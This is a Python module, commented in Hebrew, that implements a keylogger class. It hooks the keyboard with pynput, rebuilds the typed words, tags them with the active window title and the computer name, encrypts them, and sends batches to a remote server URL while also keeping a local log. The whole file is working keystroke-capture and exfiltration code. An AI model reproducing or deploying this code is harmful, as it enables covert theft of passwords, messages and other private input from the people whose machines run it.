from pynput.keyboard import Listener, Key
from logger import Logger
from window_utils import get_active_window_title, get_keyboard_layout, get_character_from_vk_code
from system_info import get_system_info
from Encryption import encryption
import datetime
# קלאס שלוכד הקשות ומטפל בהם #
class KeyLogger:
    def __init__(self, server_url, log_file, max_words_per_line=10):
        # יצירת מופע של קלאס לוגר #
        self.logger = Logger(log_file=log_file, server_url=server_url)
        # יצירת מופע של של קבלת שם המחשב #
        self.computer_name = get_system_info()["computer_name"]
        # הגדרת מילה נוכחית ליסט ריק ומקסימום גודל ליסט #
        self.current_word = ""
        self.words_buffer = []
        self.max_words_per_line = max_words_per_line
        # הגדרת חלון פעיל #
        self.current_window_title = ""
        self.last_window_title_sent = None
        self.last_active_hwnd = None

        self.pressed_keys = set()
        self.modifier_keys = {
            Key.ctrl_l, Key.ctrl_r,
            Key.alt_l, Key.alt_r,
            Key.shift, Key.shift_l, Key.shift_r,
            Key.cmd, Key.cmd_l, Key.cmd_r
        }
    # בדיקה האם החלון השתנה במידה וכן עדכון של זה #
    def update_active_window(self):
        title, hwnd = get_active_window_title()
        if hwnd != self.last_active_hwnd:
            self.last_active_hwnd = hwnd
            self.current_window_title = title
            log_line = f"\n\n[Active Window: '{title}']\n"
            self.logger.write_to_file(log_line)
            print(log_line, end='')
    # מערכת שמאפשרת לנו לדעת האם יש קיצורי מקלדת שפעילים כעת עי בדיקה איזה מקשים לחוצים כעת #
    def get_modifiers_text(self):
        keys = []
        for key in self.pressed_keys:
            if key in {Key.ctrl_l, Key.ctrl_r}:
                keys.append("Ctrl")
            elif key in {Key.alt_l, Key.alt_r}:
                keys.append("Alt")
            elif key in {Key.shift, Key.shift_l, Key.shift_r}:
                keys.append("Shift")
            elif key in {Key.cmd, Key.cmd_l, Key.cmd_r}:
                keys.append("Cmd")
        return keys
    # הוספה והצפנה של מילה לליסט קיים במידה והליסט מכיל יותר מעשרה מילים פותחים שורה חדשה ושולחים את הליסט הזה  #
    def add_word(self, word=None):
        if word is None:
            word = self.current_word
        if word:
            self.words_buffer.append(encryption(word))
            self.current_word = ""
        if len(self.words_buffer) >= self.max_words_per_line:
            self.flush_buffer(newline=True)
    # שולחת את המילים שנאספו לשרת ולוג מקומי כולל טיימסטמפ ושם החלון הפעיל אם השתנה ואז מאפסת את הבופר להמשך קליטה #
    def flush_buffer(self, newline=False, final=False):
        if final and self.current_word:
            self.add_word()

        if not self.words_buffer:
            return

        line = ' '.join(self.words_buffer)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        active_window_to_send = ""

        if self.current_window_title != self.last_window_title_sent:
            active_window_to_send = self.current_window_title
            self.last_window_title_sent = self.current_window_title

        json_data = {
            "computer_name": self.computer_name,
            "timestamp": timestamp,
            "log": line,
            "active_window": active_window_to_send
        }

        self.logger.send_to_server(json_data)

        log_line = f"{line}  [{timestamp}]"
        if active_window_to_send:
            log_line += f" [Window: {active_window_to_send}]"
        log_line += "\n"
        self.logger.write_to_file(log_line)

        if newline:
            print(f"  [{timestamp}]\n", end='')

        self.words_buffer = []
    # טיפול במקשים שונים כגון מחיקה כפתור עצירה וכו #
    # ברגע שנלחץ הכפתור נבדק האם הוא בסט #
    def on_key_press(self, key):
        try:
            self.update_active_window()

            if key in self.modifier_keys:
                self.pressed_keys.add(key)
                return
            # עצירה #
            if key == Key.esc:
                print("\n[Stopped by ESC]")
                self.flush_buffer(final=True)
                return False
            # רווח #
            elif key == Key.space:
                self.add_word()
                print(' ', end='', flush=True)
            # ירידת שורה #
            elif key == Key.enter:
                self.add_word()
                self.flush_buffer(newline=True)
                print('\n', end='', flush=True)
            # מחיקה #
            elif key == Key.backspace:
                if self.current_word:
                    self.current_word = self.current_word[:-1]
                    print('\b \b', end='', flush=True)
            # הפונקציה בודקת האם למקש המסויים יש קוד וירטואלי שניתן להמיר לתו
            elif hasattr(key, 'vk'):
                layout = get_keyboard_layout(self.last_active_hwnd)
                char = get_character_from_vk_code(key.vk, layout)
                modifiers = self.get_modifiers_text()

                if modifiers:
                    combo = '+'.join(modifiers)
                    if char:
                        combo += f"+{char}"
                    else:
                        combo += f"+{key.name if hasattr(key, 'name') else str(key)}"
                    self.add_word(combo)
                    print(f"[{combo}]", end='', flush=True)
                else:
                    if char:
                        self.current_word += char
                        print(char, end='', flush=True)

        except Exception as e:
            print(f"\n[Error]: {e}")
        return ""
    # בודקת ברגע שהכפתור שוחרר אם הוא מופיע בסט #
    def on_key_release(self, key):
        if key in self.modifier_keys:
            self.pressed_keys.discard(key)
    # מפעילה את מאזין המקלדת ומתחילה לנטר הקשות עד שהמשתמש לוחץ על כפתור הסיום #
    def run(self):
        print("Keylogger started. Press ESC to stop.\n")
        with Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
            listener.join()
